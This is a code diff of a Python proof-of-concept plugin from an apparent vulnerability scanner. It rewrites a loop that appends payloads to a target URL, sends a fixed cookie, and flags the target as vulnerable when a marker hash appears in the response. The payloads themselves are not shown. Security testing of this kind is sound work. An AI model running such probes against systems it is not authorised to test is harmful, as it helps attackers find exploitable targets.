@@ -49,12 +49,12 @@ class Poc(ABPoc):
                 )
             for payload in payloads:
                 target = arg + payload
-                cookie = "shoppingcart=a,username=a"
-                code, head, res,errcode,_ = hh.http('-b "%s" "%s"' % (cookie,target
-                                                                        ))
-                if code == 200 and "202cb962ac59075b964b07152d234b70"in res:
-                    string = getString(res)
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+                headers = {
+                    "Cookie":"shoppingcart=a,username=a"
+                }
+                req = requests.get(target,headers=headers)
+                if req.status_code == 200 and "202cb962ac59075b964b07152d234b70"in req.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(target=self.target,name=self.vuln.name,url=target))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
